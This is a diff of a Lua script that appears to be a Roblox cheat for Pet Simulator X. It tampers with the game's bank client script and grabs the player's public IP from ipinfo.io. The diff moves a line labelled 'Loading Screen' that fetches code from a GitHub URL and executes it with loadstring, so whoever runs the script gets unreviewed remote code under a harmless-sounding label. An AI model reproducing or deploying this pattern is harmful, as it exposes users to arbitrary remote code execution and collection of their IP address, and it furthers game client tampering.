@@ -180,9 +180,6 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
---// Loading Screen
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-sc/Petsimx/main/Psx"))()
-
 -- Remotes
 
 local BankPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"])
@@ -732,6 +729,9 @@ if _G.AntiLeave ~= false then
         end
     end
 end
+
+--// Loading Screen
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-sc/Petsimx/main/Psx"))()
 
 -- Pets Tables :
 
